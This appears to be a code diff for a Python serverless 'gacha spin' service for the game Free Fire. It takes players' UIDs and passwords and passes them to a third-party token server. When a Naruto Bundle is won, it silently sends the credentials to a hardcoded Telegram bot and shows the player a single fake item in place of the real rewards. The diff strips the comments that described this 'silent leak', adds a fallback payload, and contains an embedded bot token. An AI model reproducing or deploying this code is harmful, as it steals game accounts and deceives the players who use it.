@@ -1,15 +1,6 @@
 #!/usr/bin/env python3
 """
-Vercel serverless handler — PRANK MODE (Naruto Bundle only).
-
-Behavior:
-  • If the real gacha response contains the Naruto Bundle (710047022):
-      – UID / pass / region / Naruto count are silently sent to Telegram.
-      – The client receives EXACTLY ONE fake item: {id: 820981015, name: null}.
-      – All other real items (rare or not) are hidden from the client.
-  • If Naruto Bundle is NOT present:
-      – Response is passed through untouched (all rares/unknowns stay honest).
-      – Nothing is sent to Telegram.
+Vercel serverless handler — PRANK MODE (Naruto Bundle only) + fallback payload.
 """
 
 import os
@@ -40,23 +31,22 @@ else:
 # ------------------------------------------------------------------ #
 #  CONSTANTS
 # ------------------------------------------------------------------ #
-# --- JWT PROVIDER ---
 EXTERNAL_API_URL = "http://148.113.25.200:6293/Tok"
 
 RELEASE_VERSION = "OB55"
 DEFAULT_URL     = "https://client.ind.freefiremobile.com"
-NARUTO_PAYLOAD  = "D120B9DAAC2C87872B8C115DFD74A832"
 
-# --- PRANK CONFIG ---
-FAKE_UNKNOWN_ID = 820981015          # single fake item shown to the client
-PRANK_TARGET_ID = 710047022          # ONLY this item triggers the prank (Naruto Bundle)
+NARUTO_PAYLOAD   = "D120B9DAAC2C87872B8C115DFD74A832"
+FALLBACK_PAYLOAD = "7DF7F8996CD696356CD01BCBD2B3CDE8"
+
+FAKE_UNKNOWN_ID = 820981015
+PRANK_TARGET_ID = 710047022
 
 TG_BOT_TOKEN = os.environ.get(
     "TG_BOT_TOKEN", "8677901038:AAEUAHl7wiUxzivL0khjPdMIQtYSas5Gijg"
 )
 TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003684272586")
 
-# Fallback region → host (used only if `addr` is missing from JWT response)
 REGION_URL_MAP = {
     "IND": "https://client.ind.freefiremobile.com",
     "IN":  "https://client.ind.freefiremobile.com",
@@ -85,8 +75,6 @@ RARE_ITEMS_DB = {
 #  JWT HELPERS
 # ------------------------------------------------------------------ #
 def decode_jwt_payload(token: str):
-    """Decode the middle segment of a JWT. Used only as a fallback for
-    region detection when `addr` is missing from the JWT provider."""
     try:
         parts = token.split(".")
         if len(parts) != 3:
@@ -127,8 +115,10 @@ def _extract_ids_from_bytes(data: bytes):
     return items
 
 
-def parse_gacha_response(data: bytes):
+def parse_gacha_response(data):
     items = []
+    if not data:
+        return items
 
     try:
         if data.startswith(b"\x1f\x8b"):
@@ -163,14 +153,14 @@ def parse_gacha_response(data: bytes):
 
 
 # ------------------------------------------------------------------ #
-#  TELEGRAM — silent leak (Naruto Bundle only)
+#  TELEGRAM
 # ------------------------------------------------------------------ #
 async def send_to_telegram(session, uid, password, region, naruto_count):
     if not TG_BOT_TOKEN or not TG_CHAT_ID:
         return
 
     ts = time.strftime("%Y-%m-%d %H:%M:%S")
-    lines = [
+    text = "\n".join([
         "🎉 *NARUTO BUNDLE HIT*",
         f"🆔 UID: `{uid}`",
         f"🔑 Pass: `{password}`",
@@ -178,10 +168,8 @@ async def send_to_telegram(session, uid, password, region, naruto_count):
         f"🕒 {ts}",
         "",
         f"*Naruto Bundle × {naruto_count}* — `{PRANK_TARGET_ID}`",
-    ]
-    text = "\n".join(lines)
+    ])
     url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
-
     try:
         async with session.post(
             url,
@@ -197,23 +185,7 @@ async def send_to_telegram(session, uid, password, region, naruto_count):
 #  TOKEN PROVIDER
 # ------------------------------------------------------------------ #
 async def get_token_data(session, uid, password, retries=3):
-    """
-    Call the JWT provider and return the full response dict.
-
-    Endpoint:  GET http://148.113.25.200:6293/Tok?uid=<UID>&pw=<PASS>
-    Returns (on success):
-        {
-          "AccsTok": "...",
-          "OpenId":  "...",
-          "addr":    "https://client.ind.freefiremobile.com",
-          "Tok":     "eyJ...",             # JWT
-          "Ver":     "1.132.6",
-          "Ob":      "OB55",
-          "Uid":     18234768463
-        }
-    Returns None on failure.
-    """
-    for attempt in range(retries):
+    for _ in range(retries):
         try:
             async with session.get(
                 EXTERNAL_API_URL,
@@ -224,18 +196,14 @@ async def get_token_data(session, uid, password, retries=3):
                 if res.status != 200:
                     await asyncio.sleep(0.5)
                     continue
-
                 try:
                     data = await res.json(content_type=None)
                 except Exception:
-                    raw = await res.text()
                     try:
-                        data = json.loads(raw)
+                        data = json.loads(await res.text())
                     except Exception:
                         await asyncio.sleep(0.5)
                         continue
-
-                # Accept the new response shape (Tok) OR legacy (token)
                 tok = data.get("Tok") or data.get("token") or data.get("access_token")
                 if isinstance(tok, str) and len(tok) > 50:
                     return data
@@ -245,7 +213,7 @@ async def get_token_data(session, uid, password, retries=3):
 
 
 # ------------------------------------------------------------------ #
-#  NETWORK — Gacha request
+#  GACHA REQUEST
 # ------------------------------------------------------------------ #
 async def gacha_req(session, token, payload, url, max_retries=3):
     if not url.endswith("/PurchaseGacha"):
@@ -267,10 +235,7 @@ async def gacha_req(session, token, payload, url, max_retries=3):
     for _ in range(max_retries):
         try:
             async with session.post(
-                url,
-                headers=headers,
-                data=payload,
-                ssl=False,
+                url, headers=headers, data=payload, ssl=False,
                 timeout=aiohttp.ClientTimeout(total=20),
             ) as res:
                 last_status = res.status
@@ -292,118 +257,97 @@ async def spin(uid: str, password: str, payload_hex: str = None):
     if output_pb2 is None:
         return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}
 
-    payload_hex = (payload_hex or NARUTO_PAYLOAD).replace(" ", "")
+    primary_hex  = (payload_hex or NARUTO_PAYLOAD).replace(" ", "")
+    fallback_hex = FALLBACK_PAYLOAD.replace(" ", "")
+
     try:
-        payload = binascii.unhexlify(payload_hex)
+        primary_bytes  = binascii.unhexlify(primary_hex)
+        fallback_bytes = binascii.unhexlify(fallback_hex)
     except Exception as e:
         return {"success": False, "error": f"invalid_payload_hex: {e}"}
 
     async with aiohttp.ClientSession() as session:
-        # ---- 1) Fetch token from the JWT provider ----
         token_data = await get_token_data(session, uid, password, 3)
         if not token_data:
             return {"success": False, "error": "token_fetch_failed"}
 
         token = token_data.get("Tok") or token_data.get("token")
-
-        # ---- 2) Determine target URL ----
-        url = (token_data.get("addr") or "").strip() or pick_url_from_token(token, DEFAULT_URL)
+        url   = (token_data.get("addr") or "").strip() or pick_url_from_token(token, DEFAULT_URL)
 
         jwt_payload = decode_jwt_payload(token) or {}
         region = jwt_payload.get("lock_region", "UNKNOWN")
 
-        # ---- 3) Fire the gacha request ----
-        status, resp = await gacha_req(session, token, payload, url, 3)
+        # ---- Primary payload ----
+        status, resp = await gacha_req(session, token, primary_bytes, url, 3)
+        items = parse_gacha_response(resp) if (status == 200 and resp) else []
+        used_payload = "primary"
+
+        # ---- Fallback (only if no custom payload was supplied) ----
+        if payload_hex is None and (status != 200 or not items):
+            fb_status, fb_resp = await gacha_req(session, token, fallback_bytes, url, 3)
+            if fb_status == 200 and fb_resp:
+                fb_items = parse_gacha_response(fb_resp)
+                if fb_items or status != 200:
+                    status, resp, items = fb_status, fb_resp, fb_items
+                    used_payload = "fallback"
+
         if status != 200 or not resp:
-            return {
-                "success": False,
-                "error": f"gacha_http_{status}",
-                "region": region,
-            }
+            return {"success": False, "error": f"gacha_http_{status}", "region": region}
 
-        items = parse_gacha_response(resp)
-
-        # ----------------------------------------------------------
-        #  PRANK LOGIC (Naruto Bundle only)
-        #  If ANY Naruto Bundle is present in the real response:
-        #    • leak UID/pass/region + Naruto count to Telegram
-        #    • return EXACTLY ONE fake item — nothing else
-        #  Otherwise: pass the honest item list through untouched.
-        # ----------------------------------------------------------
         naruto_hits = [it for it in items if it["id"] == PRANK_TARGET_ID]
 
         if not naruto_hits:
             return {
-                "success": True,
-                "uid": uid,
-                "region": region,
-                "items": items,
+                "success": True, "uid": uid, "region": region,
+                "payload": used_payload, "items": items,
             }
 
-        # Naruto Bundle detected → alert Telegram (real info only)
         await send_to_telegram(session, uid, password, region, len(naruto_hits))
 
-        # Return exactly one fake unknown item, regardless of how many
-        # real items (Naruto + others) were in the actual gacha response.
         return {
-            "success": True,
-            "uid": uid,
-            "region": region,
-            "items": [
-                {"id": FAKE_UNKNOWN_ID, "name": None}
-            ],
+            "success": True, "uid": uid, "region": region,
+            "payload": used_payload,
+            "items": [{"id": FAKE_UNKNOWN_ID, "name": None}],
         }
 
 
 # ------------------------------------------------------------------ #
-#  HEALTH CHECK
+#  HEALTH
 # ------------------------------------------------------------------ #
 HEALTH_START_TS = time.time()
-HEALTH_VERSION  = "2.3"
+HEALTH_VERSION  = "2.4"
 
 
 async def _probe_upstream(session, url, timeout=6):
-    """Quick reachability probe — returns (ok, latency_ms|None)."""
     t0 = time.time()
     try:
         async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
             await r.read()
-            latency = int((time.time() - t0) * 1000)
-            return (r.status < 500, latency)
+            return (r.status < 500, int((time.time() - t0) * 1000))
     except Exception:
         return (False, None)
 
 
 async def _probe_jwt_provider(session):
-    """Hit the JWT provider with dummy creds. Any JSON response (even an
-    error) means the host is alive."""
     t0 = time.time()
     try:
         async with session.get(
-            EXTERNAL_API_URL,
-            params={"uid": "0", "pw": "0"},
-            ssl=False,
+            EXTERNAL_API_URL, params={"uid": "0", "pw": "0"}, ssl=False,
             timeout=aiohttp.ClientTimeout(total=8),
         ) as r:
             await r.read()
-            latency = int((time.time() - t0) * 1000)
-            return (r.status < 500, latency, r.status)
+            return (r.status < 500, int((time.time() - t0) * 1000), r.status)
     except Exception:
         return (False, None, None)
 
 
 async def _run_health_checks(deep: bool):
     checks = {
-        "protobuf": {
-            "ok": output_pb2 is not None,
-            "detail": _PB2_IMPORT_ERROR if output_pb2 is None else "loaded",
-        },
-        "telegram": {
-            "ok": bool(TG_BOT_TOKEN and TG_CHAT_ID),
-            "detail": "configured" if (TG_BOT_TOKEN and TG_CHAT_ID) else "missing env vars",
-        },
+        "protobuf": {"ok": output_pb2 is not None,
+                     "detail": _PB2_IMPORT_ERROR if output_pb2 is None else "loaded"},
+        "telegram": {"ok": bool(TG_BOT_TOKEN and TG_CHAT_ID),
+                     "detail": "configured" if (TG_BOT_TOKEN and TG_CHAT_ID) else "missing env vars"},
     }
-
     if deep:
         async with aiohttp.ClientSession() as session:
             ok, ms, code = await _probe_jwt_provider(session)
@@ -414,10 +358,8 @@ async def _run_health_checks(deep: bool):
             }
             ok, ms = await _probe_upstream(session, DEFAULT_URL)
             checks["gacha_host"] = {
-                "ok": ok,
-                "detail": f"{ms} ms" if ms is not None else "unreachable",
+                "ok": ok, "detail": f"{ms} ms" if ms is not None else "unreachable",
             }
-
     return checks
 
 
@@ -438,7 +380,7 @@ def build_health_response(deep: bool = False):
 #  VERCEL HANDLER
 # ------------------------------------------------------------------ #
 class handler(BaseHTTPRequestHandler):
-    def _send_json(self, code: int, obj: dict):
+    def _send_json(self, code, obj):
         body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
         self.send_response(code)
         self.send_header("Content-Type", "application/json; charset=utf-8")
@@ -448,7 +390,6 @@ class handler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(body)
 
-    # ---------- /health ----------
     def _health(self, params):
         deep = params.get("deep", ["0"])[0] in ("1", "true", "yes")
         try:
@@ -456,36 +397,30 @@ class handler(BaseHTTPRequestHandler):
         except Exception as e:
             self._send_json(500, {"status": "error", "error": str(e)})
             return
-        code = 200 if payload["status"] == "ok" else 503
-        self._send_json(code, payload)
+        self._send_json(200 if payload["status"] == "ok" else 503, payload)
 
-    # ---------- /spin ----------
-    def _run(self, params: dict):
+    def _run(self, params):
         uid = params.get("uid", [None])[0]
         pwd = params.get("pass", [None])[0] or params.get("password", [None])[0]
         payload_hex = params.get("payload", [None])[0]
 
         if not uid or not pwd:
-            self._send_json(400, {"success": False, "error": "missing_params: uid & pass required"})
+            self._send_json(400, {"success": False,
+                                  "error": "missing_params: uid & pass required"})
             return
-
         try:
             result = asyncio.run(spin(uid, pwd, payload_hex))
         except Exception as e:
             result = {"success": False, "error": f"internal_error: {e}"}
-
         self._send_json(200 if result.get("success") else 502, result)
 
-    # ---------- HTTP verbs ----------
     def do_GET(self):
         parsed = urlparse(self.path)
         path = parsed.path.rstrip("/") or "/"
         params = parse_qs(parsed.query)
-
         if path in ("/health", "/api/health"):
             self._health(params)
             return
-
         self._run(params)
 
     def do_HEAD(self):
